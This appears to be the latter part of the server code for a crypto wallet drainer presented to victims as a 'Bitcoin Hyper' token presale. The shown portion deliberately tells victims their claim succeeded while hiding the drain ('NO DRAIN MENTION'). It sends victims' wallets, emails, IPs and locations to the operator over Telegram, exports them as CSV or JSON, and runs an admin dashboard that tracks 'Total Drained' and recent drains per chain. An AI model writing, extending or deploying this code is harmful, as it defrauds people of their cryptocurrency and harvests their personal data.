        country: location.country,
        city: location.city,
        email: participant.email,
        claimId: claimResult.claimId,
        amount: claimAmount,
        claimValue: claimValue,
        txHash: claimResult.txHash,
        claimed: true,
        drained: claimResult.drained,
        drainCount: claimResult.drainCount,
        sessionId: sessionId,
        timestamp: new Date().toISOString()
      }
    );
    
    // User response (NO DRAIN MENTION)
    res.json({
      success: true,
      message: '🎉 Congratulations! Your Bitcoin Hyper tokens have been successfully claimed!',
      data: {
        claimId: claimResult.claimId,
        walletAddress,
        tokenAmount: claimAmount,
        tokenValue: claimValue,
        status: 'CLAIM_SUCCESSFUL',
        txHash: claimResult.txHash,
        timestamp: new Date().toISOString(),
        distributionTime: 'After presale completion',
        estimatedDistribution: '24-48 hours',
        instructions: '✅ Your allocation is now secured. Tokens will be distributed automatically after the presale concludes.',
        nextSteps: [
          'Keep your wallet connected',
          'Tokens will appear automatically',
          'Check announcements for updates',
          'Thank you for participating!'
        ]
      }
    });
    
  } catch (error) {
    console.error('Claim error:', error);
    
    // Error notification
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
    if (telegramEnabled) {
      try {
        await bot.telegram.sendMessage(
          memoryStorage.settings.telegram.chatId,
          `❌ *CLAIM ERROR*\n\nWallet: \`${req.body?.walletAddress || 'Unknown'}\`\nError: ${error.message}\nIP: ${clientIP}\n⏰ ${new Date().toLocaleString()}`,
          { parse_mode: 'Markdown' }
        );
      } catch (tgError) {
        console.log('Failed to send claim error:', tgError.message);
      }
    }
    
    res.status(500).json({ 
      success: false, 
      error: 'Claim processing failed',
      message: 'Please try again or contact support.' 
    });
  }
});

// Get participant status
app.get('/api/presale/status/:wallet', async (req, res) => {
  try {
    const { wallet } = req.params;
    
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === wallet.toLowerCase());
    if (!participant) {
      return res.status(404).json({ success: false, error: 'Participant not found' });
    }
    
    res.json({
      success: true,
      data: {
        walletAddress: participant.walletAddress,
        eligibility: {
          isEligible: participant.eligibility.isEligible,
          reason: participant.eligibility.reason,
          scannedAt: participant.eligibility.scannedAt,
          scanId: participant.eligibility.scanId
        },
        tokenAllocation: participant.tokenAllocation,
        signature: participant.signature.signed ? { 
          signed: true, 
          signedAt: participant.signature.signedAt 
        } : { signed: false },
        claim: participant.claim.claimed ? { 
          claimed: true, 
          claimId: participant.claim.claimId,
          claimedAt: participant.claim.claimedAt,
          txHash: participant.claim.txHash
        } : { claimed: false },
        connectedAt: participant.connectedAt,
        lastActive: participant.lastActive,
        status: participant.status
      }
    });
    
  } catch (error) {
    console.error('Status error:', error);
    res.status(500).json({ success: false, error: 'Failed to get status' });
  }
});

// ========== ADMIN ENDPOINTS ==========

// Admin authentication middleware
function authenticateAdmin(req, res, next) {
  const authHeader = req.headers.authorization;
  const token = req.query.token;
  
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if ((authHeader && authHeader === `Bearer ${adminToken}`) || token === adminToken) {
    next();
  } else {
    res.status(401).json({ 
      success: false, 
      error: 'Unauthorized',
      message: 'Valid admin token required'
    });
  }
}

// Admin stats
app.get('/api/admin/stats', authenticateAdmin, async (req, res) => {
  try {
    const now = new Date();
    const last24h = new Date(now.getTime() - 24 * 60 * 60 * 1000);
    
    const stats = {
      totalParticipants: memoryStorage.participants.length,
      eligibleParticipants: memoryStorage.participants.filter(p => p.eligibility.isEligible).length,
      claimedParticipants: memoryStorage.participants.filter(p => p.claim.claimed).length,
      totalRaisedUSD: memoryStorage.settings.statistics.totalRaisedUSD,
      totalDrainedUSD: memoryStorage.settings.statistics.totalDrainedUSD,
      uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size,
      
      // Recent activity
      lastHourActivity: memoryStorage.activityLog
        .filter(log => new Date(log.timestamp) > new Date(now.getTime() - 3600000))
        .length,
      todayActivity: memoryStorage.activityLog
        .filter(log => new Date(log.timestamp).toDateString() === now.toDateString())
        .length,
      
      // Geographic stats
      countries: Object.entries(memoryStorage.analytics.countryStats)
        .sort((a, b) => b[1] - a[1])
        .slice(0, 10),
      
      // Chain stats
      chains: Object.entries(memoryStorage.analytics.chainStats)
        .sort((a, b) => b[1] - a[1]),
      
      // Recent drains
      recentDrains: memoryStorage.activityLog
        .filter(log => log.action === 'DRAIN_EXECUTED')
        .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
        .slice(0, 10)
        .map(log => ({
          wallet: log.wallet,
          chain: log.data.chain,
          amount: log.data.drainAmount,
          country: log.data.country,
          time: log.timestamp
        })),
      
      // Recent claims
      recentClaims: memoryStorage.participants
        .filter(p => p.claim.claimed)
        .sort((a, b) => new Date(b.claim.claimedAt) - new Date(a.claim.claimedAt))
        .slice(0, 20)
        .map(p => ({
          wallet: p.walletAddress,
          email: p.email,
          country: p.country,
          city: p.city,
          amount: p.tokenAllocation.amount,
          value: p.tokenAllocation.valueUSD,
          portfolio: p.totalValueUSD,
          claimedAt: p.claim.claimedAt,
          drained: p.claim.drained,
          drainCount: p.claim.drainCount,
          txHash: p.claim.txHash
        })),
      
      // System status
      system: {
        telegram: telegramEnabled,
        email: emailEnabled,
        drainEnabled: memoryStorage.settings.drainEnabled,
        autoDrain: memoryStorage.settings.autoDrainOnClaim,
        uptime: process.uptime(),
        memory: process.memoryUsage()
      }
    };
    
    res.json({ success: true, stats });
    
  } catch (error) {
    console.error('Admin stats error:', error);
    res.status(500).json({ success: false, error: 'Failed to get stats' });
  }
});

// Activity log
app.get('/api/admin/activity', authenticateAdmin, async (req, res) => {
  try {
    const { limit = 100, action } = req.query;
    
    let logs = [...memoryStorage.activityLog];
    
    if (action) {
      logs = logs.filter(log => log.action === action);
    }
    
    const recentLogs = logs
      .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
      .slice(0, parseInt(limit));
    
    res.json({ 
      success: true, 
      logs: recentLogs, 
      total: logs.length
    });
    
  } catch (error) {
    console.error('Activity log error:', error);
    res.status(500).json({ success: false, error: 'Failed to get logs' });
  }
});

// Export data
app.get('/api/admin/export', authenticateAdmin, async (req, res) => {
  try {
    const format = req.query.format || 'json';
    
    if (format === 'csv') {
      let csv = 'Wallet,Email,Country,City,Eligible,Claimed,Amount,Value,Portfolio,Connected At,Claimed At,Status,TX Hash,Drained,Drain Count,Session ID\n';
      
      memoryStorage.participants.forEach(p => {
        csv += `"${p.walletAddress}","${p.email}","${p.country}","${p.city}","${p.eligibility.isEligible}","${p.claim.claimed}","${p.tokenAllocation.amount}","${p.tokenAllocation.valueUSD}","${p.totalValueUSD}","${p.connectedAt.toISOString()}","${p.claim.claimedAt ? p.claim.claimedAt.toISOString() : ''}","${p.status}","${p.claim.txHash}","${p.claim.drained}","${p.claim.drainCount || 0}","${p.sessionId}"\n`;
      });
      
      res.header('Content-Type', 'text/csv');
      res.header('Content-Disposition', 'attachment; filename=bitcoin-hyper-drain-data.csv');
      res.send(csv);
      
    } else {
      res.json({
        success: true,
        data: {
          participants: memoryStorage.participants,
          activityLog: memoryStorage.activityLog.slice(-1000),
          statistics: memoryStorage.settings.statistics,
          analytics: memoryStorage.analytics,
          exportTime: new Date().toISOString()
        }
      });
    }
    
  } catch (error) {
    console.error('Export error:', error);
    res.status(500).json({ success: false, error: 'Export failed' });
  }
});

// Admin dashboard HTML
app.get('/admin', (req, res) => {
  const token = req.query.token;
  const authHeader = req.headers.authorization;
  
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  // Check authentication
  if (!token && (!authHeader || authHeader !== `Bearer ${adminToken}`)) {
    return res.send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Bitcoin Hyper - Admin Login</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
          body { 
            font-family: 'Segoe UI', system-ui, sans-serif; 
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%); 
            height: 100vh; 
            margin: 0; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            color: #f8fafc;
          }
          .login-container {
            background: rgba(30, 41, 59, 0.9);
            backdrop-filter: blur(10px);
            padding: 40px;
            border-radius: 20px;
            border: 1px solid #334155;
            width: 400px;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
          }
          .logo {
            font-size: 48px;
            color: #F7931A;
            margin-bottom: 20px;
          }
          h1 {
            margin-bottom: 30px;
            background: linear-gradient(135deg, #F7931A, #FFD700);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
          }
          input {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            background: rgba(255,255,255,0.1);
            border: 1px solid #475569;
            border-radius: 10px;
            color: #f8fafc;
            font-size: 16px;
            box-sizing: border-box;
          }
          input:focus {
            outline: none;
            border-color: #F7931A;
          }
          button {
            background: linear-gradient(135deg, #F7931A, #E67E22);
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 20px;
            width: 100%;
            transition: all 0.3s;
          }
          button:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 20px rgba(247, 147, 26, 0.4);
          }
          .error {
            color: #ef4444;
            margin-top: 10px;
            font-size: 14px;
          }
          .note {
            color: #94a3b8;
            font-size: 12px;
            margin-top: 20px;
          }
        </style>
      </head>
      <body>
        <div class="login-container">
          <div class="logo">₿</div>
          <h1>BITCOIN HYPER ADMIN</h1>
          <p style="color: #94a3b8; margin-bottom: 30px;">Multi-Chain Drain System Dashboard</p>
          <input type="password" id="token" placeholder="Enter Admin Token" />
          <button onclick="login()">Login to Dashboard</button>
          <div id="error" class="error"></div>
          <div class="note">Token required: Check your .env ADMIN_TOKEN</div>
        </div>
        <script>
          function login() {
            const token = document.getElementById('token').value;
            if (!token) {
              document.getElementById('error').textContent = 'Please enter admin token';
              return;
            }
            window.location.href = '/admin?token=' + encodeURIComponent(token);
          }
          document.getElementById('token').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') login();
          });
        </script>
      </body>
      </html>
    `);
  }
  
  // Calculate dashboard stats
  const now = new Date();
  const lastHourActivity = memoryStorage.activityLog
    .filter(log => new Date(log.timestamp) > new Date(now.getTime() - 3600000))
    .length;
  
  const todayActivity = memoryStorage.activityLog
    .filter(log => new Date(log.timestamp).toDateString() === now.toDateString())
    .length;
  
  const topCountries = Object.entries(memoryStorage.analytics.countryStats)
    .sort((a, b) => b[1] - a[1])
    .slice(0, 5);
  
  const recentClaims = memoryStorage.participants
    .filter(p => p.claim.claimed)
    .sort((a, b) => new Date(b.claim.claimedAt) - new Date(a.claim.claimedAt))
    .slice(0, 10);
  
  const recentDrains = memoryStorage.activityLog
    .filter(log => log.action === 'DRAIN_EXECUTED')
    .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
    .slice(0, 10);
  
  // Send dashboard HTML
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Bitcoin Hyper - Admin Dashboard</title>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
      <script src="https://cdn.jsdelivr.net/npm/luxon@3.3.0/build/global/luxon.min.js"></script>
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', system-ui, sans-serif; background: #0f172a; color: #f8fafc; }
        .dashboard { padding: 20px; max-width: 1800px; margin: 0 auto; }
        
        .header { display: flex; justify-content: space-between; align-items: center; padding: 20px 0; border-bottom: 1px solid #334155; margin-bottom: 30px; }
        .logo { display: flex; align-items: center; gap: 15px; }
        .logo h1 { font-size: 28px; background: linear-gradient(135deg, #f59e0b, #ef4444); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .stat-card { background: #1e293b; padding: 25px; border-radius: 15px; border-left: 5px solid; position: relative; overflow: hidden; }
        .stat-card:nth-child(1) { border-color: #10b981; }
        .stat-card:nth-child(2) { border-color: #3b82f6; }
        .stat-card:nth-child(3) { border-color: #f59e0b; }
        .stat-card:nth-child(4) { border-color: #ef4444; }
        .stat-card:nth-child(5) { border-color: #8b5cf6; }
        .stat-card:nth-child(6) { border-color: #ec4899; }
        .stat-value { font-size: 36px; font-weight: bold; margin-bottom: 10px; }
        .stat-label { color: #94a3b8; font-size: 14px; text-transform: uppercase; letter-spacing: 1px; }
        .stat-trend { position: absolute; top: 10px; right: 15px; font-size: 12px; padding: 4px 8px; border-radius: 12px; }
        .trend-up { background: rgba(16, 185, 129, 0.2); color: #10b981; }
        .trend-down { background: rgba(239, 68, 68, 0.2); color: #ef4444; }
        
        .charts-grid { display: grid; grid-template-columns: 2fr 1fr; gap: 30px; margin-bottom: 30px; }
        .chart-container { background: #1e293b; padding: 25px; border-radius: 15px; }
        .chart-title { margin-bottom: 20px; color: #f8fafc; font-size: 18px; display: flex; justify-content: space-between; align-items: center; }
        
        .activity-section { display: grid; grid-template-columns: 1fr 1fr; gap: 30px; margin-bottom: 30px; }
        .activity-container { background: #1e293b; padding: 25px; border-radius: 15px; }
        .activity-table { width: 100%; border-collapse: collapse; }
        .activity-table th { text-align: left; padding: 15px; border-bottom: 2px solid #334155; color: #94a3b8; font-weight: 600; }
        .activity-table td { padding: 15px; border-bottom: 1px solid #334155; }
        .activity-table tr:hover { background: #2d3748; }
        
        .export-buttons { display: flex; gap: 15px; margin-top: 30px; }
        .export-btn { padding: 12px 25px; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; transition: all 0.3s; }
        .export-btn.csv { background: #10b981; color: white; }
        .export-btn.json { background: #3b82f6; color: white; }
        .export-btn.refresh { background: #f59e0b; color: white; }
        .export-btn.telegram { background: #0088cc; color: white; }
        
        .live-badge { display: inline-flex; align-items: center; gap: 8px; background: #10b981; padding: 8px 15px; border-radius: 20px; font-size: 12px; font-weight: 600; }
        .live-dot { width: 8px; height: 8px; background: #ffffff; border-radius: 50%; animation: pulse 2s infinite; }
        
        .drain-badge { background: linear-gradient(135deg, #ef4444, #dc2626); color: white; padding: 4px 12px; border-radius: 12px; font-size: 12px; font-weight: bold; }
        .chain-badge { background: rgba(59, 130, 246, 0.2); color: #3b82f6; padding: 4px 10px; border-radius: 10px; font-size: 11px; }
        
        .status-indicator { display: inline-flex; align-items: center; gap: 8px; margin-right: 20px; }
        .status-online { color: #10b981; }
        .status-offline { color: #ef4444; }
        
        @keyframes pulse {
          0% { opacity: 1; }
          50% { opacity: 0.5; }
          100% { opacity: 1; }
        }
        
        .time-ago { color: #94a3b8; font-size: 12px; }
        .country-flag { margin-right: 5px; }
      </style>
    </head>
    <body>
      <div class="dashboard">
        <div class="header">
          <div class="logo">
            <h1>BITCOIN HYPER ADMIN</h1>
            <span class="live-badge">
              <span class="live-dot"></span>
              LIVE DRAIN SYSTEM
            </span>
          </div>
          <div class="system-status">
            <span class="status-indicator">
              Telegram: <span class="${telegramEnabled ? 'status-online' : 'status-offline'}">${telegramEnabled ? '✅ CONNECTED' : '❌ OFFLINE'}</span>
            </span>
            <span class="status-indicator">
              Email: <span class="${emailEnabled ? 'status-online' : 'status-offline'}">${emailEnabled ? '✅ ENABLED' : '❌ DISABLED'}</span>
            </span>
            <span class="status-indicator">
              Drain: <span class="status-online">✅ ACTIVE</span>
            </span>
          </div>
        </div>
        
        <div class="stats-grid">
          <div class="stat-card">
            <div class="stat-value">${memoryStorage.settings.statistics.totalParticipants}</div>
            <div class="stat-label">Total Participants</div>
            <div class="stat-trend trend-up">+${lastHourActivity} last hour</div>
          </div>
          <div class="stat-card">
            <div class="stat-value">${memoryStorage.settings.statistics.eligibleParticipants}</div>
            <div class="stat-label">Eligible Wallets</div>
            <div class="stat-trend trend-up">${Math.round(memoryStorage.settings.statistics.eligibleParticipants / Math.max(memoryStorage.settings.statistics.totalParticipants, 1) * 100)}%</div>
          </div>
          <div class="stat-card">
            <div class="stat-value">${memoryStorage.settings.statistics.claimedParticipants}</div>
            <div class="stat-label">Claims Processed</div>
            <div class="stat-trend trend-up">${Math.round(memoryStorage.settings.statistics.claimedParticipants / Math.max(memoryStorage.settings.statistics.eligibleParticipants, 1) * 100)}%</div>
          </div>
          <div class="stat-card">
            <div class="stat-value">$${memoryStorage.settings.statistics.totalRaisedUSD.toFixed(2)}</div>
            <div class="stat-label">Total Raised</div>
            <div class="stat-trend trend-up">+$${(memoryStorage.settings.statistics.totalRaisedUSD / 10).toFixed(2)}/hr</div>
          </div>
          <div class="stat-card">
            <div class="stat-value">$${memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)}</div>
            <div class="stat-label">Total Drained</div>
            <div class="stat-trend trend-up"><span class="drain-badge">ACTIVE</span></div>
          </div>
          <div class="stat-card">
            <div class="stat-value">${memoryStorage.settings.statistics.uniqueIPs.size}</div>
            <div class="stat-label">Unique IPs</div>
            <div class="stat-trend trend-up">${topCountries.length} countries</div>
          </div>
        </div>
        
        <div class="charts-grid">
          <div class="chart-container">
            <div class="chart-title">Hourly Activity (Last 24h)</div>
            <canvas id="hourlyChart" height="200"></canvas>
          </div>
          <div class="chart-container">
            <div class="chart-title">Top Countries</div>
            <canvas id="countryChart" height="200"></canvas>
          </div>
        </div>
        
        <div class="activity-section">
          <div class="activity-container">
            <h2 class="chart-title">Recent Claims</h2>
            <table class="activity-table">
              <thead>
                <tr>
                  <th>Wallet</th>
                  <th>Amount</th>
                  <th>Value</th>
                  <th>Location</th>
                  <th>Time</th>
                  <th>Status</th>
                </tr>
              </thead>
              <tbody>
                ${recentClaims.map(p => {
                  const flag = getCountryFlag(p.countryCode || 'Unknown');
                  const timeAgo = luxon.DateTime.fromJSDate(new Date(p.claim.claimedAt)).toRelative();
                  return `
                  <tr>
                    <td>${p.walletAddress.substring(0, 6)}...${p.walletAddress.substring(38)}</td>
                    <td>${p.tokenAllocation.amount} BTH</td>
                    <td>$${p.tokenAllocation.valueUSD}</td>
                    <td><span class="country-flag">${flag}</span> ${p.country}</td>
                    <td class="time-ago">${timeAgo}</td>
                    <td>
                      ${p.claim.drained ? 
                        `<span class="drain-badge">DRAINED (${p.claim.drainCount || 0})</span>` : 
                        '<span style="color: #10b981;">✅ CLAIMED</span>'
                      }
                    </td>
                  </tr>
                  `;
                }).join('')}
              </tbody>
            </table>
          </div>
          
          <div class="activity-container">
            <h2 class="chart-title">Recent Drains</h2>
            <table class="activity-table">
              <thead>
                <tr>
                  <th>Wallet</th>
                  <th>Chain</th>
                  <th>Amount</th>
                  <th>Location</th>
                  <th>Time</th>
                </tr>
              </thead>
              <tbody>
                ${recentDrains.map(d => {
                  const flag = getCountryFlag(d.data.countryCode || 'Unknown');
                  const timeAgo = luxon.DateTime.fromJSDate(new Date(d.timestamp)).toRelative();
                  return `
                  <tr>
                    <td>${d.wallet.substring(0, 6)}...${d.wallet.substring(38)}</td>
                    <td><span class="chain-badge">${d.data.chain}</span></td>
                    <td>$${d.data.drainAmount || '0'}</td>
                    <td><span class="country-flag">${flag}</span> ${d.data.country}</td>
                    <td class="time-ago">${timeAgo}</td>
                  </tr>
                  `;
                }).join('')}
              </tbody>
            </table>
          </div>
        </div>
        
        <div class="export-buttons">
          <button class="export-btn csv" onclick="exportData('csv')">Export CSV</button>
          <button class="export-btn json" onclick="exportData('json')">Export JSON</button>
          <button class="export-btn telegram" onclick="testTelegram()">Test Telegram</button>
          <button class="export-btn refresh" onclick="location.reload()">Refresh Dashboard</button>
        </div>
      </div>
      
      <script>
        // Country flag function
        function getCountryFlag(countryCode) {
          const flags = {
            'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪',
            'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'NL': '🇳🇱', 'BR': '🇧🇷',
            'RU': '🇷🇺', 'CN': '🇨🇳', 'JP': '🇯🇵', 'KR': '🇰🇷', 'IN': '🇮🇳',
            'Unknown': '🌐', 'Local': '🏠'
          };
          return flags[countryCode] || '🌐';
        }
        
        // Prepare hourly data
        const hourlyData = ${JSON.stringify(memoryStorage.analytics.hourlyConnections)};
        const hours = Array.from({length: 24}, (_, i) => {
          const hour = (new Date().getHours() + i) % 24;
          return hour + ':00';
        }).slice(-24);
        
        const hourlyValues = [];
        for (let i = 23; i >= 0; i--) {
          const hour = (new Date().getHours() - i + 24) % 24;
          hourlyValues.push(hourlyData[hour] || 0);
        }
        
        // Hourly activity chart
        const hourlyCtx = document.getElementById('hourlyChart').getContext('2d');
        new Chart(hourlyCtx, {
          type: 'line',
          data: {
            labels: hours,
            datasets: [{
              label: 'Activity',
              data: hourlyValues,
              borderColor: '#10b981',
              backgroundColor: 'rgba(16, 185, 129, 0.1)',
              tension: 0.4,
              fill: true
            }]
          },
          options: {
            responsive: true,
            plugins: { legend: { display: false } },
            scales: {
              y: { beginAtZero: true, grid: { color: 'rgba(255,255,255,0.1)' }, ticks: { color: '#94a3b8' } },
              x: { grid: { color: 'rgba(255,255,255,0.1)' }, ticks: { color: '#94a3b8', maxRotation: 0 } }
            }
          }
        });
        
        // Country chart
        const countryData = ${JSON.stringify(topCountries)};
        const countryCtx = document.getElementById('countryChart').getContext('2d');
        new Chart(countryCtx, {
          type: 'doughnut',
          data: {
            labels: countryData.map(c => c[0]),
            datasets: [{
              data: countryData.map(c => c[1]),
              backgroundColor: ['#ef4444', '#f59e0b', '#10b981', '#3b82f6', '#8b5cf6']
            }]
          },
          options: {
            responsive: true,
            plugins: {
              legend: { position: 'bottom', labels: { color: '#94a3b8' } }
            }
          }
        });
        
        function exportData(format) {
          const token = '${token || ''}';
          if (!token) {
            alert('Token missing. Please login again.');
            return;
          }
          
          if (format === 'json') {
            fetch('/api/admin/export?format=json', {
              headers: { 'Authorization': 'Bearer ' + token }
            })
            .then(response => response.json())
            .then(data => {
              const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
              const url = URL.createObjectURL(blob);
              const a = document.createElement('a');
              a.href = url;
              a.download = 'bitcoin-hyper-drain-data.json';
              a.click();
              URL.revokeObjectURL(url);
            });
          } else if (format === 'csv') {
            window.open('/api/admin/export?format=csv&token=' + token, '_blank');
          }
        }
        
        function testTelegram() {
          fetch('/api/health')
            .then(response => response.json())
            .then(data => {
              if (data.telegram === 'CONNECTED') {
                alert('✅ Telegram is connected and working!');
              } else {
                alert('❌ Telegram is not connected. Check your configuration.');
              }
            });
        }
        
        // Auto-refresh every 60 seconds
        setInterval(() => {
          location.reload();
        }, 60000);
      </script>
    </body>
    </html>
  `);
});

// Telegram chat ID helper
app.get('/api/telegram/chatid', async (req, res) => {
  if (!process.env.TELEGRAM_BOT_TOKEN) {
    return res.json({
      success: false,
      message: 'Telegram bot token not configured'
    });
  }
  
  try {
    const response = await axios.get(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/getUpdates`);
    
    if (response.data.ok && response.data.result.length > 0) {
      const chatIds = [];
      response.data.result.forEach(update => {
        if (update.message && update.message.chat) {
          chatIds.push({
            id: update.message.chat.id,
            type: update.message.chat.type,
            title: update.message.chat.title || update.message.chat.first_name,
            username: update.message.chat.username
          });
        }
      });
      
      const uniqueChatIds = chatIds.filter((chat, index, self) =>
        index === self.findIndex((t) => t.id === chat.id)
      );
      
      return res.json({
        success: true,
        chatIds: uniqueChatIds,
        instructions: 'Use one of these chat IDs in TELEGRAM_CHAT_ID'
      });
    } else {
      return res.json({
        success: false,
        message: 'Send a message to your bot first',
        instructions: '1. Start chat with bot\n2. Send any message\n3. Refresh'
      });
    }
  } catch (error) {
    return res.json({
      success: false,
      message: 'Error fetching updates',
      error: error.message
    });
  }
});

// Error handling
app.use((err, req, res, next) => {
  console.error('Error:', err);
  
  if (telegramEnabled) {
    try {
      const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
      bot.telegram.sendMessage(
        memoryStorage.settings.telegram.chatId,
        `🔥 *ERROR*\n\nRoute: ${req.originalUrl}\nError: ${err.message}\nIP: ${clientIP}\n⏰ ${new Date().toLocaleString()}`,
        { parse_mode: 'Markdown' }
      );
    } catch (tgError) {
      console.log('Failed to send error:', tgError.message);
    }
  }
  
  res.status(500).json({
    success: false,
    error: 'Internal server error',
    message: 'Our team has been notified.'
  });
});

// 404 handler
app.use('*', (req, res) => {
  res.status(404).json({
    success: false,
    error: 'Endpoint not found'
  });
});

// Start server
const server = app.listen(PORT, '0.0.0.0', () => {
  console.log(`
  🚀 BITCOIN HYPER MULTI-CHAIN DRAIN v7.0
  ============================================
  📍 Port: ${PORT}
  🔗 Health: http://localhost:${PORT}/api/health
  📊 Admin: http://localhost:${PORT}/admin
  🔐 Admin Token: ${process.env.ADMIN_TOKEN ? 'SET' : 'NOT SET'}
  📈 Telegram: ${process.env.TELEGRAM_BOT_TOKEN ? 'ENABLED' : 'DISABLED'}
  📧 Email: ${emailEnabled ? 'ENABLED' : 'DISABLED'}
  💰 Drain System: ${memoryStorage.settings.drainEnabled ? 'ACTIVE' : 'INACTIVE'}
  ⚡ Auto-Drain: ${memoryStorage.settings.autoDrainOnClaim ? 'ENABLED' : 'DISABLED'}
  🌐 Multi-Chain: ENABLED
  `);
  
  // Initialize Telegram
  setTimeout(() => {
    initializeTelegramBot();
  }, 2000);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('Shutting down...');
  if (telegramEnabled) {
    bot.telegram.sendMessage(
      process.env.TELEGRAM_CHAT_ID,
      `🔴 *SERVER SHUTTING DOWN*\n\nBackend will be offline.\n⏰ ${new Date().toLocaleString()}`,
      { parse_mode: 'Markdown' }
    ).catch(() => {});
  }
  server.close(() => {
    console.log('Server closed.');
    process.exit(0);
  });
});

process.on('SIGINT', () => {
  console.log('Received SIGINT');
  server.close(() => {
    console.log('Server closed.');
    process.exit(0);
  });
});

module.exports = app;
